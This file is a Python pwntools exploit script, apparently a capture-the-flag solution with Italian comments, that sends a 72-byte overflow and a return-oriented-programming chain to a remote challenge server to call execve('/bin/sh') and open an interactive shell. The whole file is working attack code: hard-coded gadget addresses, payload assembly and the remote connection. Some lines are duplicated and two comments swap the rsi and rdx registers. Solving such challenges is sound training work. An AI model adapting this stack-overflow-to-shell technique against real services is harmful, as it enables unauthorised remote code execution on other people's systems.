from pwn import *

HOST = 'cyberchallenge.disi.unitn.it'
PORT = 9103
OFFSET = 72

#take a look for atol

context.terminal = ["konsole", "-e"]

breakpoint = "0x0000000000401191"#c'è un return

p = remote(HOST, PORT)


# r = process("./bin")
# r = gdb.debug(
#     "./bin",
#     f"""
#     break *{breakpoint}
#     continue
#     """
# )

bin_sh = b"/bin/sh\x00"

pop_rax = p64(0x0000000000401199)
pop_rax = p64(0x0000000000401199)

pop_rdx = p64(0x000000000040119f)
pop_rdx = p64(0x000000000040119f)


pop_rsi = p64(0x000000000040119d)
pop_rsi = p64(0x000000000040119d)

mov_rdi_rsp = p64(0x0000000000401196)   
mov_rdi_rsp = p64(0x0000000000401196)

syscall = p64(0x00000000004011a3)
syscall = p64(0x00000000004011a3)


payload = b"A" * OFFSET

"""
io voglio 
    rdi = "bin/sh"
    rsi = 0
    rdx = 0
    rax = 59 (numero della syscall)
    syscall effettuare la syscall
    
    quindi:
    
"""

payload += mov_rdi_rsp  #copia rsp in rdi (così punta alla stringa sullo stack) e fa anche pop rax
payload += bin_sh       #stringa a cui puntare
payload += pop_rax      #carica un valore in rax
payload += p64(59)      #valore da caricare (num chiamata)
payload += pop_rsi      #carica un valore in rdx
payload += p64(0)
payload += pop_rdx      #carica un valore in rsi
payload += p64(0)
payload += syscall      #esegue la syscall (execve)

p.sendline(payload)
p.interactive()
